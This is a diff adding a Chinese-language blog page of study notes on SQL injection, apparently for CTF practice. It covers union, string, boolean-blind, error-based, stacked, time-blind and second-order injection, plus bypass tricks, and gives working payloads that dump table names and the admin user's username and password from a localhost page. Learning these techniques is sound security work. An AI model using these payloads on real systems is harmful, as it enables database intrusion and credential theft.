@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<style>
+    p{
+        margin-top: 0 !important;
+        margin-bottom: 1rem !important;
+        font-size: 1.1rem;
+    }
+    figure{
+        margin: 0 !important;
+    }
+    pre{
+        padding: 0 !important;
+        margin-top: 0 !important;
+        margin-bottom: 1rem !important;
+    }
+
+    td{
+        padding: 0 !important;
+        margin-bottom: 1rem !important;
+    }
+    h1,h2,h3,h4,h5,h6{
+        margin-top: 0 !important;
+        margin-bottom: 1rem !important;
+    }
+    @media (min-width: 1024px) {
+        #middle-box{
+            min-width: 56rem;
+        }
+    
+    }
+</style>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>back - sql注入</title>
+    <link rel="stylesheet" href="/css/styles.css">
+    <link rel="stylesheet" href="/css/tailwind.css">
+    <link rel="stylesheet" href="/css/highlight.css">
+    <link rel="stylesheet" href="/css/toc.css">
+    
+<header class="bg-black text-hacker-white py-4 font-dos font-extrabold">
+    <div class="container mx-auto flex items-center justify-between space-x-8">
+    
+      <h1 class="text-2xl font-bold ml-[100px] md:ml-0 animate-pulse text-hacker-color1 md:mr-[20%]">
+        <a href="/" class="hover:text-white transition-colors select-none">
+          back
+        </a>
+      </h1>
+  
+    <!-- 大屏幕 -->
+      <nav class="hidden md:block">
+        <ul class="flex space-x-6">
+          
+            <li>
+              <a href="/" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                Home
+              </a>
+            </li>
+          
+            <li>
+              <a href="/archives" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                Archives
+              </a>
+            </li>
+          
+            <li>
+              <a href="/categories" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                Categories
+              </a>
+            </li>
+          
+            <li>
+              <a href="/tags" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                Tags
+              </a>
+            </li>
+          
+            <li>
+              <a href="/about" class="select-none text-lg hover:text-hacker-color1 transition-all hover:underline decoration-wavy duration-300 text-hacker-color3">
+                About
+              </a>
+            </li>
+          
+        </ul>
+      </nav>
+  
+      <!-- 小屏幕 -->
+      <button id="menu-toggle" class="block md:hidden text-white focus:outline-none">
+        <svg class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+          <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16"></path>
+        </svg>
+      </button>
+    </div>
+  
+    <!-- 折叠菜单 -->
+    <nav id="mobile-menu" class="hidden bg-black">
+      <ul class="space-y-2 py-4 px-6">
+        
+          <li>
+            <a href="/" class="block text-white hover:text-hacker-color1 transition-colors">
+              Home
+            </a>
+          </li>
+        
+          <li>
+            <a href="/archives" class="block text-white hover:text-hacker-color1 transition-colors">
+              Archives
+            </a>
+          </li>
+        
+          <li>
+            <a href="/categories" class="block text-white hover:text-hacker-color1 transition-colors">
+              Categories
+            </a>
+          </li>
+        
+          <li>
+            <a href="/tags" class="block text-white hover:text-hacker-color1 transition-colors">
+              Tags
+            </a>
+          </li>
+        
+          <li>
+            <a href="/about" class="block text-white hover:text-hacker-color1 transition-colors">
+              About
+            </a>
+          </li>
+        
+      </ul>
+    </nav>
+  
+    <!-- RSS Link -->
+    <link rel="alternate" type="application/rss+xml" title=" RSS" href="/rss.xml" />
+  </header>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lunr.js/2.3.9/lunr.min.js"></script>
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="/js/search.js"></script>
+  <script>
+        document.addEventListener("DOMContentLoaded", () => {
+    const menuToggle = document.getElementById("menu-toggle");
+    const mobileMenu = document.getElementById("mobile-menu");
+
+    menuToggle.addEventListener("click", () => {
+        if (mobileMenu.classList.contains("hidden")) {
+        mobileMenu.classList.remove("hidden");
+        } else {
+        mobileMenu.classList.add("hidden");
+        }
+    });
+    });
+
+  </script>
+
+
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body class="bg-black text-hacker-color3 container mx-auto" style="overflow-x:hidden">
+    <!-- 文章标题 -->
+    <h1 class="text-5xl text-hacker-color1 font-bold font-dos my-6 text-center">sql注入</h1>
+
+    <!-- 发布时间 -->
+    <p class="text-hacker-color3 text-center text-sm mb-4">
+        2026-11-22
+    </p>
+
+    <!-- 文章内容 -->
+    <div id="article-content" class="article-entry prose prose-invert mx-auto max-w-4xl leading-relaxed highlight" style="display: flex;">
+        <div id="middle-box">
+            <h6 id="什么是sql"><a href="#什么是sql" class="headerlink" title="什么是sql"></a>什么是sql</h6><p>sql是一门语言，通过sql语句可以快速实现数据的增上改查 </p>
+<p>Create 增<br>Delete 删<br>Update 改<br>Read   查</p>
+<p>CURD  就是指对数据的增删改查</p>
+<p>博客系统代码</p>
+<p>sql语句</p>
+<pre><code>select id,username,password from user;
+
+update page set title=&#39;aaa&#39;,content=&#39;bbb&#39; where id =1;
+
+delete from page where id =1;
+
+insert into page (title,content) values(&#39;aaa&#39;,&#39;bbb&#39;);
+</code></pre>
+<p>php语句</p>
+<pre><code>$conn = new mysqli($host,$username,$password,$db,$port);
+
+$conn-&gt;query();
+
+$result-&gt;fetch_all();
+
+$result-&gt;fetch_array();
+</code></pre>
+<h5 id="sql注入的危害"><a href="#sql注入的危害" class="headerlink" title="sql注入的危害"></a>sql注入的危害</h5><p>歪曲了sql语句的执行结果<br>泄露了数据库中的敏感数据<br>干扰查询结果，劫持查询的流程，绕过了权限检查<br>通过文件操作写入恶意代码，可能造成rce</p>
+<h5 id="sql注入的类型"><a href="#sql注入的类型" class="headerlink" title="sql注入的类型"></a>sql注入的类型</h5><h4 id="类型一：数字型注入和union-注入"><a href="#类型一：数字型注入和union-注入" class="headerlink" title="类型一：数字型注入和union 注入"></a>类型一：数字型注入和union 注入</h4><pre><code>http://127.0.0.1/page_detail.php?id=1 union select 1,(select password from user where username=&#39;admin&#39;),3 limit 1,2
+</code></pre>
+<h4 id="类型二：字符型注入"><a href="#类型二：字符型注入" class="headerlink" title="类型二：字符型注入"></a>类型二：字符型注入</h4><p>前面闭合 后面注释  来逃逸出单引号或者双引号</p>
+<pre><code>http://127.0.0.1/page_detail.php?id=1&#39; union select 1,(select password from user where username=&#39;admin&#39;),3 limit 1,2%23
+</code></pre>
+<h4 id="查所有表"><a href="#查所有表" class="headerlink" title="查所有表"></a>查所有表</h4><pre><code>http://127.0.0.1/page_detail.php?id=1&#39; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()),3 limit 1,2%23
+</code></pre>
+<h4 id="查所有列"><a href="#查所有列" class="headerlink" title="查所有列"></a>查所有列</h4><pre><code>http://127.0.0.1/page_detail.php?id=1&#39; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#39;user&#39; and table_schema=database()),3 limit 1,2%23
+</code></pre>
+<h4 id="查敏感数据"><a href="#查敏感数据" class="headerlink" title="查敏感数据"></a>查敏感数据</h4><pre><code>http://127.0.0.1/page_detail.php?id=1&#39; union select 1,(select group_concat(username,&#39;-&#39;,password) from user),3 limit 1,2%23
+</code></pre>
+<p>注释两种形式   #   –空格</p>
+<h4 id="类型三：布尔盲注"><a href="#类型三：布尔盲注" class="headerlink" title="类型三：布尔盲注"></a>类型三：布尔盲注</h4><p>boolean 盲注</p>
+<p>条件：<br>没有明显的回显点<br>只有得到两个结果，如果执行正常，页面不报错，执行不正常，页面报错</p>
+<p>我们执行了我们自定义的sql语句，如果语句是正确的，或者说，语句内我们的猜测是正确的，就返回正常或者特定页面，否则返回错误页面或者其他特定页面</p>
+<p>1 当我们猜对(sql执行正常)情况下，页面没有报错<br>2 当我们猜错(sql执行不下去)情况下，页面报错</p>
+<p>基于上面的原理，我们可以发送大量的请求，来猜测我们需要的数据</p>
+<h4 id="类型四：报错注入"><a href="#类型四：报错注入" class="headerlink" title="类型四：报错注入"></a>类型四：报错注入</h4><p>条件：</p>
+<p>1 没有明显的回显点<br>2 有mysql执行sql语句的报错信息</p>
+<p>a. 利用updatexml函数来强制报错，带出我们的查询结果</p>
+<pre><code>username=admin&#39; or updatexml(1,concat(&#39;^&#39;,(select group_concat(column_name) from information_schema.columns where table_name=&#39;user&#39; and table_schema=database()),&#39;^&#39;),1)%23&amp;password=123123
+</code></pre>
+<p>b. extractvalue 和updatexml 功能一样，也是通过报错带出查询数据用</p>
+<p>c. 整数溢出报错   exp  pow cot  </p>
+<p>d. 不存在函数报错   select ctfshow();</p>
+<h4 id="类型五：堆叠注入"><a href="#类型五：堆叠注入" class="headerlink" title="类型五：堆叠注入"></a>类型五：堆叠注入</h4><p>我们控制的语句，可以执行多条sql</p>
+<p>注意点：<br>需要后台代码支持多条语句执行，而这个支持，需要不同于上面的代码写法</p>
+<h4 id="类型六：时间盲注"><a href="#类型六：时间盲注" class="headerlink" title="类型六：时间盲注"></a>类型六：时间盲注</h4><p>条件：<br>没有明显的回显点<br>页面也没有明显的变化，即使sql语句执行不成功</p>
+<p>总结：<br>可以执行sql注入，但是不知道执行结果，也不知道执行了没，甚至不知道报错了没</p>
+<p>原理：</p>
+<p>猜测某个条件，如果成立，就sleep 几秒  </p>
+<pre><code> select id,username,password from user where username = &#39;admin&#39; and if((select substr(username,1,1) from user where id = 1)=&#39;a&#39;,sleep(3),1);
+</code></pre>
+<p>a sleep进行延迟</p>
+<p>b benchmark(count,exp)  </p>
+<p>如果执行一个比较耗时的表达式，非常多的次数，加起来，就有可能造成延时的效果</p>
+<p>  条件：针对数据库连接的长连接有效   </p>
+<p>  php 一般 解释执行完毕后，就会关闭数据库连接，下次请求的时候再次连接数据库<br>  java 维护一个数据库连接池，长时间连接，需要处理请求时，拿出来进行sql查询，查询完后，放回数据库连接池</p>
+<p>e rlike<br>  通过大量的正则匹配来实现延迟</p>
+<h4 id="类型七：二次注入"><a href="#类型七：二次注入" class="headerlink" title="类型七：二次注入"></a>类型七：二次注入</h4><p>条件：</p>
+<p>1 无法直接注入，但是可以把要注入的数据插入数据库中</p>
+<p>2 其他地方引用数据库中的数据，拼接sql语句时，默认不再进行过滤，直接拼接，造成曲线控制了sql语句</p>
+<p>1 整数型注入&#x2F;union联合注入<br>2 字符型注入<br>3 布尔盲注<br>4 报错注入<br>5 堆叠注入<br>6 时间盲注<br>7 二次注入</p>
+<p>不同注入点的应对技巧</p>
+<p>sql语句分为CURD操作</p>
+<p>select 注入</p>
+<p>1 当我们控制点在where 之后，则尝试 闭合参数引号，有回显就联合注入，有报错，就报错注入等等</p>
+<p>2 select title,content from page;</p>
+<pre><code>select (select password from user where username=&#39;admin&#39;) ,content from page;
+</code></pre>
+<p>3 注入点在 group by 或者oder by之后</p>
+<pre><code>select title,content from page order by title;
+
+select title,content from page order by title,if(2&gt;1,sleep(3),1);
+</code></pre>
+<p>4 注入点在limit 之后 5.6版本之前  8以后废弃 </p>
+<pre><code>select title,content from page limit 1;
+
+select title,content from page limit 1 procedure analyse(updatexml(1,concat(&quot;^&quot;,(select user()),&quot;^&quot;),1));
+</code></pre>
+<p>包括一些小技巧</p>
+<p>1 字符串可以转为16进制来用<br>select 0x63746673686f77</p>
+<p>2 相同或者类似功能的函数相互替换</p>
+<p>  substr sustring </p>
+<p>  类似cat 用tac替代绕过检测 </p>
+<h2 id="其实直接sqlmap一把梭就行了"><a href="#其实直接sqlmap一把梭就行了" class="headerlink" title="其实直接sqlmap一把梭就行了"></a>其实直接sqlmap一把梭就行了</h2>
+        </div>
+        
+            <div class="post-container">
+            <aside class="toc-container">
+                <button class="toc-toggle">文章目录</button>
+                <nav class="toc" id="toc"></nav>
+            </aside>
+        </div>
+        
+    </div>
+
+
+    <!-- 返回主页链接 -->
+    <div class="text-center my-8">
+        <a href="/" class="text-hacker-color1 underline hover:text-hacker-color2">← Back to Home</a>
+    </div>
+
+      
+      <script src="/js/toc.js"></script>  <!-- 引入 TOC 逻辑 -->
+      
+      
+
+    <footer class="bg-black text-gray-400 py-4">
+ <div class="container mx-auto text-center">
+  <p>© <span id="current-year"></span>  Lao Zhen 
+    <br> Powered by <a class="hover:text-white duration-150 hover:underline decoration-slice" target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a> & <a class="hover:text-white duration-150 hover:underline decoration-slice" target="_blank" rel="noopener" href="https://github.com/m310ct/hexo-theme-hexploit">Hexpolit</a></p>
+ </div>
+</footer>
+
+<script> 
+ document.getElementById("current-year").textContent = new Date().getFullYear();
+</script>
+<script>
+window.MathJax = {
+tex: {
+  inlineMath: [['$', '$'], ['\\(', '\\)']]  // 启用 $...$ 和 \( ... \)
+},
+svg: {
+  fontCache: 'global'
+}
+};
+</script>
+<script src="js/tex-mml-chtml.js" async></script>
+
+
+
+</body>
+</html>
